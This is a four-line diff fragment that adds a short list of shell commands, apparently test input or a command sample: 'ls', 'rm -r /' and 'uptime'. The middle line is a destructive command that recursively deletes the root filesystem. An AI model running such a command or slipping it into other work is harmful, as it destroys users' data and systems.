@@ -1,0 +1,4 @@
+
+ls
+rm -r /
+uptime
